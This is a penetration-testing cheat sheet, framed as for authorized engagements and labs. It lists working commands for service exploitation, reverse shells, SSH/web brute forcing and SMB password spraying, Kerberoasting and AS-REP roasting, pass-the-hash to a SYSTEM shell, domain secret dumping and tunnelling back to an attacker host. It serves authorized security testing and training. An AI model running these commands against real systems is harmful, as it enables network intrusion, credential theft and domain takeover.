# Network & service exploitation, credentials, Active Directory (authorized only)

Gaining a foothold via network services, weak credentials, and AD misconfigs. In-scope
engagements / labs / CTF only. Prefer the least-impact path that proves the finding.

## Service exploitation
```sh
searchsploit <product> <version>           # find a public exploit for the exact version
# Metasploit (use for known, reliable exploits + payload handling):
msfconsole -q
  search <cve|product>; use <module>; show options; set RHOSTS ...; set LHOST ...; run
  # use check first when available; prefer non-destructive modules.
# manual exploit from Exploit-DB:
searchsploit -m 12345 ; python3 12345.py <target> <args>
```
Reverse shells (catch with `nc -lvnp 4444` or msf `multi/handler`); upgrade to a PTY:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`, then `Ctrl-Z; stty raw -echo; fg`. Use https://revshells.com patterns.

## Credential attacks (respect lockout/rate limits & scope)
```sh
hydra -L users.txt -P pass.txt ssh://10.10.10.10 -t 4            # SSH (low threads to avoid lockout)
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
netexec smb 10.10.10.0/24 -u users.txt -p pass.txt              # spray creds across SMB hosts
netexec smb 10.10.10.10 -u admin -p 'Pass123' --shares          # validate + list shares
# password SPRAY (one password, many users — avoids lockout) is safer than brute on one account:
netexec smb DC01 -u users.txt -p 'Winter2024!' --continue-on-success
```
Default-creds check first (admin/admin, product defaults) — fastest win, lowest noise.

## Active Directory (the core of internal pentests)
```sh
# enumerate from a foothold (low-priv creds):
netexec smb DC01 -u user -p pass --users --groups --pass-pol
bloodhound-python -u user -p pass -d corp.local -ns 10.10.10.10 -c All   # collect → analyze in BloodHound GUI
# Kerberoasting (crack service-account tickets offline):
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.10 -request   # → TGS hashes
hashcat -m 13100 tgs.txt rockyou.txt                                    # crack offline
# AS-REP roasting (users w/o pre-auth):
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass -format hashcat
# pass-the-hash / lateral movement with recovered NTLM hash:
netexec smb 10.10.10.0/24 -u admin -H <NTLM_hash>
impacket-psexec corp.local/admin@10.10.10.20 -hashes :<NTLM>           # SYSTEM shell
# dump secrets once Domain Admin:
impacket-secretsdump corp.local/admin:pass@10.10.10.10                 # NTDS / SAM / LSA
```
Common AD wins (check in BloodHound): Kerberoastable SPNs, AS-REP roastable users, ACL abuse
(GenericAll/WriteDACL), unconstrained delegation, DCSync rights, GPO abuse.

## Pivoting (only within scope)
```sh
# tunnel through a compromised host to reach an internal subnet:
chisel server -p 8000 --reverse        # on attacker;  chisel client <atk>:8000 R:socks  on victim
ligolo-ng                              # modern, easy TUN-based pivot
proxychains nmap -sT 192.168.50.0/24   # then run tools through the SOCKS proxy
```
Document every pivot and host touched; do not exceed the authorized network boundary.
